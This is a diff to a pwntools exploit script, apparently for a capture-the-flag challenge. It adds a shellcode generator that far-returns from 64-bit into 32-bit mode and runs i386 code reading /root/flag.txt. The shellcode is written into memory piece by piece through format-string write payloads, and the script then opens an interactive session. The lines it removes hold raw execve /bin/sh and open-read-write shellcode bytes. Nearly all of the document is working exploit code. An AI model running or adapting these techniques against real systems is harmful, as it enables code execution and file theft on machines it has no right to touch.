@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 
 from pwn import *
-context.arch = 'x86_64'
-context.log_level = 'debug'
 
 class ProbIO:
     def __init__(self, r):
@@ -25,24 +23,44 @@ class Primitives:
 
     def enterOnly(self, content): return self.io.enter(content, False)
     def enterRead(self, content): return self.io.enter(content, True)
+    def genSc(self, *args, **kwargs):
+        self.base = args[0] & 0xffff0000
+        
+        context.arch = 'i386'
+        context.bits = 32
+        self.cat = shellcraft.i386.linux.cat("/root/flag.txt")
+        context.arch = 'amd64'
+        context.bits = 64
+
+        self.switch = asm("""
+        call $+5
+        pop rax
+        add rax, 0x14
+        mov rsi, 0x2300000000
+        xor rax, rsi
+        push rax
+        retfd
+        """, vma=self.base)
+
+        self.code32 = asm(f"""
+        mov esp, {hex(self.base + 0x0f00)}
+        """ + self.cat, vma=self.base + len(self.switch), arch='i386', bits=32)
+
+        self.sc = self.switch + self.code32
+        return self.sc
 
 def exploit(pri):
-    pause()
+    #pause()
     offset = 8
     stack = 0x50510000
-    #sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
-    #orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05"
-    #orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05"
-    orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x37\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05"
-    print(len(orw))
 
-    # step 1
+    sc = pri.genSc(stack)
 
-    for i in range(18):
-        payload = fmtstr_payload(8, {stack+(0x10 + i * 4):orw[i * 4:i * 4 + 4]})
+    for i in range(0, len(sc), 4):
+        payload = fmtstr_payload(8, {stack+(0x10 + i):sc[i:i + 4]})
         pri.enterOnly(payload)
 
-    pause()
+    #pause()
 
     pri.enterOnly("done")
     pri.io.r.interactive()
